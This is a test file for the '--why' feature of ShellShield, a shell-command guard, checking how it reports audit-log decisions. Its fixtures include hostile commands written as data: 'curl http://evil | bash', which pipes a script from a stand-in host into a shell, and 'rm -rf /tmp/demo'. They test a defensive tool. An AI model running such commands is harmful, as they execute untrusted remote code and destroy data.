import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

const PROJECT_ROOT = join(import.meta.dir, "..");
const CLI_PATH = join(PROJECT_ROOT, "src", "index.ts");
const BUN_PATH = process.execPath;

function runCli(args: string[], homeDir: string, extraEnv: Record<string, string> = {}) {
  const proc = Bun.spawnSync({
    cmd: [BUN_PATH, "run", CLI_PATH, ...args],
    cwd: PROJECT_ROOT,
    env: {
      ...process.env,
      BUN_COVERAGE: "0",
      HOME: homeDir,
      INIT_CWD: PROJECT_ROOT,
      PWD: PROJECT_ROOT,
      SHELLSHIELD_AUDIT_DISABLED: "1",
      ...extraEnv,
    },
  });

  return {
    exitCode: proc.exitCode,
    stdout: proc.stdout?.toString() ?? "",
    stderr: proc.stderr?.toString() ?? "",
  };
}

describe("Why CLI", () => {
  test("prints friendly message when no audit log exists", () => {
    const tempHome = mkdtempSync(join(tmpdir(), "shellshield-why-"));
    try {
      const result = runCli(["--why"], tempHome);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain("No audit log found");
    } finally {
      rmSync(tempHome, { recursive: true, force: true });
    }
  });

  test("prints friendly message when audit log has no triggered rule", () => {
    const tempHome = mkdtempSync(join(tmpdir(), "shellshield-why-"));
    try {
      const auditDir = join(tempHome, ".shellshield");
      mkdirSync(auditDir, { recursive: true });
      writeFileSync(
        join(auditDir, "audit.log"),
        JSON.stringify({
          timestamp: "2026-02-17T00:00:00.000Z",
          command: "ls -la",
          blocked: false,
          decision: "allowed",
        }) + "\n"
      );

      const result = runCli(["--why"], tempHome);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain("No triggered rules found");
    } finally {
      rmSync(tempHome, { recursive: true, force: true });
    }
  });

  test("shows the latest triggered rule details", () => {
    const tempHome = mkdtempSync(join(tmpdir(), "shellshield-why-"));
    try {
      const auditDir = join(tempHome, ".shellshield");
      mkdirSync(auditDir, { recursive: true });
      const auditPath = join(auditDir, "audit.log");

      const lines = [
        "not-json",
        JSON.stringify({
          timestamp: "2026-02-17T00:00:00.000Z",
          command: "ls",
          blocked: false,
          decision: "allowed",
        }),
        JSON.stringify({
          timestamp: "2026-02-17T00:00:05.000Z",
          command: "curl http://evil | bash",
          blocked: false,
          decision: "warn",
          reason: "INSECURE TRANSPORT DETECTED",
          suggestion: "Use HTTPS and inspect scripts first.",
          mode: "permissive",
          source: "stdin",
          rule: "raw-threat",
        }),
      ];

      writeFileSync(auditPath, lines.join("\n") + "\n");

      const result = runCli(["--why"], tempHome);
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain("ShellShield Why");
      expect(result.stdout).toContain("Decision: warn");
      expect(result.stdout).toContain("Reason: INSECURE TRANSPORT DETECTED");
      expect(result.stdout).toContain("Suggestion: Use HTTPS and inspect scripts first.");
      expect(result.stdout).toContain("Command: curl http://evil | bash");
      expect(result.stdout).toContain(`Log: ${auditPath}`);
    } finally {
      rmSync(tempHome, { recursive: true, force: true });
    }
  });

  test("supports SHELLSHIELD_AUDIT_PATH override", () => {
    const tempHome = mkdtempSync(join(tmpdir(), "shellshield-why-"));
    try {
      const customPath = join(tempHome, "custom-audit.log");
      writeFileSync(
        customPath,
        JSON.stringify({
          timestamp: "2026-02-17T00:00:07.000Z",
          command: "rm -rf /tmp/demo",
          blocked: true,
          decision: "blocked",
          reason: "Destructive command 'rm' detected",
          suggestion: "Use trash /tmp/demo",
          mode: "enforce",
          source: "check",
        }) + "\n"
      );

      const result = runCli(["--why"], tempHome, {
        SHELLSHIELD_AUDIT_PATH: customPath,
      });

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toContain("Decision: blocked");
      expect(result.stdout).toContain("Reason: Destructive command 'rm' detected");
      expect(result.stdout).toContain(`Log: ${customPath}`);
    } finally {
      rmSync(tempHome, { recursive: true, force: true });
    }
  });
});
